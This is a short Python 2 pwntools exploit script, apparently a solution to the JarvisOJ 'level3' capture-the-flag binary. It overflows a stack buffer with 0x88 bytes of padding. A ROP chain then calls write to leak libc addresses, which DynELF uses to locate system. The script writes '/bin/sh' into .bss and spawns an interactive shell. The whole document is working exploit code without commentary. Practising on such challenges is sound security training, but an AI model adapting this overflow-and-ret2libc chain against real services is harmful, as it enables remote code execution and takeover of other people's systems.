from pwn import *
context.log_level = 'debug'

#cn = remote('pwn2.jarvisoj.com', 9880)
cn = process('./level3')
bin = ELF('./level3')

p3ret = 0x08048509
bss = 0x0804A024

#cn.recvuntil('Input:\n')

def leak(address):
    pay = 'a'*0x88 +'bbbb'
    pay += p32(bin.symbols['write']) + p32(p3ret) + p32(1) + p32(address) + p32(4)
    pay += p32(bin.symbols['main'])
    cn.sendline(pay)
    cn.recvuntil('Input:\n')
    data = cn.recv(4)
    print "[*]leaking: " + data
    return data

d = DynELF(leak, elf=ELF('./level3'))
p_system = d.lookup('system','libc')
print '[!]find p_system: ' + hex(p_system)

pay = 'a'*0x88 +'bbbb'
pay += p32(bin.symbols['read']) + p32(p3ret) + p32(0) + p32(bss) + p32(100)
pay += p32(p_system) + 'bbbb' + p32(bss)

cn.sendline(pay)
cn.sendline('/bin/sh\x00')
cn.interactive()
